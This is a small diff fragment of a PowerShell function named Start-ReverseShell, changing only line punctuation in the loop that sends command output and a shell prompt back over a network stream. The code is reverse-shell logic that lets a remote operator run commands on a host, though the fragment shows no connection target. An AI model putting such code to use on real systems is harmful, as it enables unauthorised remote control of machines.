@@ -29,10 +29,10 @@ Function Start-ReverseShell {
                 $sendback = $_.Exception.Message;
             }
 
-            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>'
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte, 0, $sendbyte.Length)
-            $stream.Flush()
+            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>';
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($sendbyte, 0, $sendbyte.Length);
+            $stream.Flush();
         }
     }
     finally {
